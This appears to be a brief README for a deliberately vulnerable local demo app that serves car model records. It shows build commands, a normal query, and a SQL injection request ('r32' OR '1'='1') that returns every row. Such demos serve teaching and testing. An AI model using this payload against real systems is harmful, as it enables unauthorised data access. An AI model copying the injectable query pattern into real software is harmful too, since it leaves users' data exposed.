Build

```
podman build . -t sqli && podman run --rm -it -p 8080:8080 sqli
```

Query
```
curl "localhost:8080/?model=beetle_tdi"
[{"name":"beetle_tdi","year":2002}]
```

SQLi
```
curl "localhost:8080/?model=r32'%20OR%20'1'='1"
[{"name":"rabbit","year":1984},{"name":"beetle_tdi","year":2002},{"name":"phaeton","year":2004},{"name":"r32","year":2004}]
```
